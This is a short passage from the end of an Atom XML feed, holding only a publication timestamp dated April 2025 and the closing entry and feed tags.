        <published>2025-04-01T14:54:36.000Z</published>
    </entry>
</feed>